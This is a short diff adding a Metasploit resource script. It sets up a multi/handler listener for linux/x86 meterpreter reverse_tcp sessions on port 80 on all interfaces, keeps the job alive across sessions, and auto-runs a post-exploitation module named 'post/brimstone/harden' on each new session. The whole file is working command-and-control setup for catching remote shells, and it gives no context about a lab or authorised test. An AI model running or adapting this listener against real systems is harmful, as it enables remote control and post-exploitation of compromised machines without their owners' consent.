@@ -1,0 +1,7 @@
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter/reverse_tcp
+set LPORT 80
+set LHOST 0.0.0.0
+set ExitOnSession false
+set AutoRunScript "post/brimstone/harden"
+exploit -j
